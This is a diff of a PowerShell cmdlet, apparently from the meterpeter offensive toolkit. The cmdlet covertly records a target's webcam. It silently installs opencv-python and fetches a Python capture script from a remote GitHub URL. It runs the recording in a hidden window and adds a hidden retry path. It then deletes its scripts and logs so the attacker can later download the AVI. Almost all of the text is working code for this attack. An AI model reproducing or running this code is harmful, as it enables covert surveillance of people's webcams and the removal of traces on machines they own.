@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: python3
    Optional Dependencies: opencv-python
-   PS cmdlet Dev version: v1.0.6
+   PS cmdlet Dev version: v1.0.8
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
@@ -18,7 +18,7 @@
    Remark: cmdlet will auto-install 'opencv-python' package using pip3 (silent)
    Parameter RecTime accepts values from 8 seconds (minimum) up to 60 seconds (max)
    to prevent the AVI file to be very large if attacker needs to download it from host.
-   Remark: Invoke force 'true' to bypass cmdlet internal checks\tests to force execution.
+   Remark: Invoke force 'true' to bypass cmdlet internal checks\tests and force execution.
 
 .Parameter RecTime
    The amount of time to rec in seconds (default: 10)
@@ -81,7 +81,7 @@
 )
 
 
-$cmdletver = "v1.0.6"
+$cmdletver = "v1.0.8"
 $StartPath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
@@ -129,10 +129,6 @@ If($Force -ieq "false")
    }
 }
 
-#Cleanup
-Remove-Item -Path "pyver.log" -Force
-Remove-Item -Path "opencv.log" -Force
-
 If(Test-Path -Path "$WorkingDir\outpy.avi")
 {
    #Delete old avi file
@@ -156,12 +152,12 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam
 
 #Config python script
 $ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
-$RegInstallPath = Get-ItemProperty -Path 'HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath'|Select-Object -ExpandProperty '(default)'
+$RegInstallPath = Python -c "import os, sys; print(os.path.dirname(sys.executable))"
 If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
 {
    write-host "  x " -ForegroundColor Red -NoNewline
    write-host "Notfound: " -ForegroundColor DarkGray -NoNewline
-   write-host "HKCU:\SOFTWARE\Python\PythonCore\***\InstallPath" -ForegroundColor Red
+   write-host "PythonCore\InstallPath" -ForegroundColor Red
    Start-Sleep -Seconds 1
 
    $RegInstallPath = "$Env:LOCALAPPDATA\Programs\python"
@@ -170,7 +166,8 @@ If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
    write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
 }
 
-#Get python3 site-packages directory { bypass tests invoking -force 'true' }
+
+##Get python3 site-packages directory { bypass tests invoking -force 'true' }
 $PythonInstallPath = (Get-ChildItem -Path "$RegInstallPath" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
 If(-not($PythonInstallPath) -or ($Force -ieq "true"))
 {
@@ -183,7 +180,6 @@ Else
    $ReplaceMe = $PythonInstallPath -replace '\\','\\'
    ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
 }
-
 
 #Rename the output video.avi file
 ((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "outpy.avi","$FileName")|Set-Content -Path "$WorkingDir\WebCam.py" -Force
@@ -209,11 +205,47 @@ Stop-Process -Name "python3.*" -Force
 write-host "  + " -ForegroundColor DarkYellow -NoNewline
 write-host "Comverting webcam raw data to AVI format."
 Start-Sleep -Seconds 7 #Give some time to allow avi to finish
-Remove-Item -Path "$WorkingDir\WebCam.py" -Force
-write-host "* " -ForegroundColor Green -NoNewline
-write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
-write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
-write-host "'" -ForegroundColor DarkGray
+
+#Make sure video.avi file was created
+If(-not(Test-Path -Path "${WorkingDir}\${FileName}"))
+{
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host "fail to create: '" -ForegroundColor DarkGray -NoNewline
+   write-host "${WorkingDir}\${FileName}" -ForegroundColor Red -NoNewline
+   write-host "'" -ForegroundColor DarkGray
+
+   write-host "+ Trying alternative execution method.." -ForegroundColor DarkYellow
+   $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py"|Select-Object -Skip 2
+   echo $ParseRawData > "$WorkingDir\WebCam.py";Start-Sleep -Milliseconds 800
+
+   Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
+   Start-Sleep -Seconds $RecTime
+   #Stop capture after sellected time
+   Stop-Process -Name "python3.*" -Force
+
+   Start-Sleep -Milliseconds 1300
+   If(-not(Test-Path -Path "${WorkingDir}\${FileName}"))
+   {
+      write-host "x " -ForegroundColor Red -NoNewline
+      write-host "fail to create: '" -ForegroundColor DarkGray -NoNewline
+      write-host "${WorkingDir}\${FileName}" -ForegroundColor Red -NoNewline
+      write-host "'" -ForegroundColor DarkGray      
+   }
+   Else
+   {
+      write-host "* " -ForegroundColor Green -NoNewline
+      write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
+      write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
+      write-host "'" -ForegroundColor DarkGray      
+   }
+}
+Else
+{
+   write-host "* " -ForegroundColor Green -NoNewline
+   write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
+   write-host "${WorkingDir}\${FileName}" -ForegroundColor Green -NoNewline
+   write-host "'" -ForegroundColor DarkGray
+}
 
 
 If($AutoView -ieq "true")
@@ -224,6 +256,12 @@ If($AutoView -ieq "true")
    Start-Process "${WorkingDir}\${FileName}"
 }
 
-write-host ""
+
+#Cleanup
+Remove-Item -Path "pyver.log" -Force
+Remove-Item -Path "opencv.log" -Force
+Remove-Item -Path "$WorkingDir\WebCam.py" -Force
+
 cd $StartPath
+write-host ""
 exit
